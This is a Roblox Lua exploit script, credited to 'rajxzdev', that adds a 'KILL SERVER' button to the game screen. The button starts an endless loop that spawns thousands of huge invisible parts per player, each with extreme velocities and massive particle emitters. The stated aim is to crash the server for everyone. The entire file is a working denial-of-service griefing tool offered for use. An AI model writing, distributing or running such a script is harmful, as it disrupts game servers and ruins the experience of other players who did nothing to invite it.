-- rajxzdev - SILENT OMEGA 2025 (GUI + 1-CLICK EVERYONE CRASH)

local sg = Instance.new("ScreenGui", game.CoreGui)
sg.ResetOnSpawn = false

local f = Instance.new("Frame", sg)
f.Size = UDim2.new(0, 300, 0, 160)
f.Position = UDim2.new(0.5, -150, 0.5, -80)
f.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
f.BorderSizePixel = 0

local c = Instance.new("UICorner", f)
c.CornerRadius = UDim.new(0, 16)

local t = Instance.new("TextLabel", f)
t.Size = UDim2.new(1, 0, 0, 50)
t.BackgroundTransparency = 1
t.Text = "rajxzdev"
t.TextColor3 = Color3.new(1, 1, 1)
t.Font = Enum.Font.GothamBlack
t.TextSize = 32

local b = Instance.new("TextButton", f)
b.Size = UDim2.new(0, 260, 0, 80)
b.Position = UDim2.new(0.5, -130, 0.5, 10)
b.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
b.Text = "KILL SERVER"
b.TextColor3 = Color3.new(1, 1, 1)
b.Font = Enum.Font.GothamBlack
b.TextSize = 40
Instance.new("UICorner", b).CornerRadius = UDim.new(0, 12)

b.MouseButton1Click:Connect(function()
    b.Text = "DEAD"
    b.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    
    spawn(function()
        while task.wait() do
            for _, plr in pairs(game.Players:GetPlayers()) do
                if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    for i = 1, 2500 do
                        spawn(function()
                            local p = Instance.new("Part", workspace)
                            p.Size = Vector3.new(999,999,999)
                            p.Position = plr.Character.HumanoidRootPart.Position
                            p.Anchored = false
                            p.CanCollide = false
                            p.Transparency = 1
                            local bv = Instance.new("BodyVelocity", p)
                            bv.Velocity = Vector3.new(9e9,9e9,9e9)
                            bv.MaxForce = Vector3.new(9e9,9e9,9e9)
                            local pe = Instance.new("ParticleEmitter", p)
                            pe.Rate = 999999
                            pe.Lifetime = NumberRange.new(999)
                            pe.Speed = NumberRange.new(99999)
                            game.Debris:AddItem(p, 0.01)
                        end)
                    end
                end
            end
        end
    end)
end)
